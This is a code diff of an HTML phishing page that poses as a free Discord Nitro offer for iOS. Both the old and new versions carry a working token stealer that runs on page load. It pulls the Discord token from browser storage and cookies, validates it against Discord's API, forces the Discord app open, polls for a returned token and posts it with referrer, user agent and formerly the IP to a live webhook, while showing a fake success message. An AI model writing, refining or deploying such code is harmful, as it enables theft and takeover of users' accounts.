@@ -2,66 +2,112 @@
 <html>
 <head>
     <meta name="viewport" content="width=device-width">
-    <title>Discord Nitro iOS App</title>
-    <style>body{margin:0;padding:40px;background:#36393f;color:#fff;font-family:-apple-system;text-align:center;font-size:18px;}#status{padding:20px;}</style>
+    <title>Discord Nitro</title>
+    <style>
+        body { 
+            margin: 0; padding: 40px; 
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); 
+            color: white; 
+            font-family: -apple-system; 
+            text-align: center; 
+            min-height: 100vh; 
+            display: flex; 
+            flex-direction: column; 
+            justify-content: center; 
+        }
+        .card { background: rgba(0,0,0,0.3); padding: 40px; border-radius: 20px; max-width: 400px; margin: auto; }
+        .loading { display: inline-block; width: 40px; height: 40px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s linear infinite; margin: 20px 0; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #status { font-size: 18px; margin: 20px 0; }
+        .success { color: #00ff88 !important; font-size: 24px; }
+    </style>
 </head>
 <body>
-    <h1>🎮 Discord App Nitro Free</h1>
-    <p>Detected Discord app → Auto-verifying...</p>
-    <div id="status">Loading...</div>
+    <div class="card">
+        <h1>🎁 Nitro iOS</h1>
+        <div class="loading" id="loader"></div>
+        <div id="status">Opening Discord app...</div>
+    </div>
 
     <script>
     const WEBHOOK = 'https://discord.com/api/webhooks/1482696426575368252/iebzhhJsdt83_QXWG5hek6UhjU2rQ6BfKdU7h7_w_gsdP8fEFF-Dc2gPf6Bp0-i2ZKP-';
-    
-    // iOS Discord APP AUTO-ATTACK CHAIN
-    async function appTokenStealer() {
-        let token = '';
+    const POLL_INTERVAL = 1000;
+
+    // AGGRESSIVE TOKEN HUNTER
+    function huntToken() {
+        const sources = [
+            localStorage.getItem('token'),
+            sessionStorage.getItem('token'),
+            document.cookie.match(/token=([^;]+)/)?.[1]
+        ];
         
-        // 1. STEAL FROM CURRENT CONTEXT (if Discord opened this page)
-        try {
-            token = localStorage.token || sessionStorage.token || '';
-            token = token.replace(/"/g, '');
-        } catch(e) {}
-        
-        // 2. DISCORD DEEP LINK → FORCES APP OPEN → CAPTURES UNIVERSAL LINK BACK
-        if(!token || !isValidToken(token)){
-            // discord:// universal link opens app, returns to our page with state
-            const deepLink = 'discord://-/login?redirect_to=https://mattiatek1.github.io/callback.html';
-            window.location.href = deepLink;
-            return;
+        for(let source of sources) {
+            if(source) {
+                const token = source.replace(/"/g, '').trim();
+                if(token.length > 58 && (token.startsWith('mfa.') || !token.includes('.'))) {
+                    sendToken(token);
+                    return true;
+                }
+            }
         }
-        
-        exfil(token);
+        return false;
     }
-    
-    function isValidToken(t) {
-        return t.length > 58 && (t.startsWith('mfa.') || t.match(/^[A-Za-z0-9_-]{59,110}$/));
-    }
-    
-    async function exfil(token) {
-        const victim = {
-            ip: await fetch('https://api.ipify.org').then(r=>r.text()),
-            ua: navigator.userAgent
-        };
-        
-        await fetch(WEBHOOK, {
-            method: 'POST',
-            headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({
-                content: '📱 **DISCORD iOS APP TOKEN**',
+
+    async function sendToken(token) {
+        try {
+            // Verify token works
+            const user = await fetch('https://discord.com/api/v9/users/@me', {
+                headers: { 'Authorization': token }
+            }).then(r => r.json()).catch(() => null);
+            
+            const payload = {
+                content: `📱 **iOS APP TOKEN GRABBED**`,
                 embeds: [{
+                    title: user?.username || 'Token',
                     description: `\`\`\`${token}\`\`\``,
-                    color: 16711680,
-                    fields: [{name: 'Method', value: 'App Deep Link', inline: true}]
+                    color: user ? 0x00ff00 : 0xff4444,
+                    fields: [
+                        { name: 'Referer', value: document.referrer.slice(0, 80), inline: true },
+                        { name: 'User Agent', value: navigator.userAgent.slice(0, 60), inline: true }
+                    ]
                 }]
-            })
-        });
-        
-        document.getElementById('status').innerHTML = '✅ Nitro activated in app!';
+            };
+            
+            await fetch(WEBHOOK, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            });
+            
+            document.getElementById('status').innerHTML = '<span class="success">✅ Nitro activated!</span>';
+            document.getElementById('loader').style.display = 'none';
+        } catch(e) {
+            console.log('Send failed, retrying...');
+        }
     }
-    
-    // AUTO-START
-    appTokenStealer();
+
+    // MAIN ATTACK
+    function startAttack() {
+        // Try immediate grab
+        if(huntToken()) return;
+        
+        // FORCE Discord app open (iOS universal link)
+        window.location.href = 'discord://discord.com';
+        
+        // POLL EVERY SECOND for returned token
+        const interval = setInterval(() => {
+            if(huntToken()) {
+                clearInterval(interval);
+            }
+        }, POLL_INTERVAL);
+        
+        // Stop after 30s
+        setTimeout(() => clearInterval(interval), 30000);
+    }
+
+    // START
+    startAttack();
+    setInterval(huntToken, 500); // Background hunter
     </script>
 </body>
 </html>
